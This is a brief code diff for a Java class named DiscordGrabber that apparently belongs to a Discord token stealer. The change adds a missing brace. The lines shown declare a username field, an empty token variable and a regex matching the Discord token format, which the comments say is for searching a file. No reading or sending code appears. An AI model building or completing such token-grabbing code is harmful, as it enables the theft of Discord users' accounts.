@@ -1,4 +1,4 @@
-public class DiscordGrabber
+public class DiscordGrabber {
     private static String username = System.getProperty("user.name"); //Gets the user his username
     private static String token = ""; //Create an empty variable called token
     private static String regex = "[\\w]{24}\\.[\\w]{6}\\.[\\w]{27}"; //The regex that will be used to look through the file
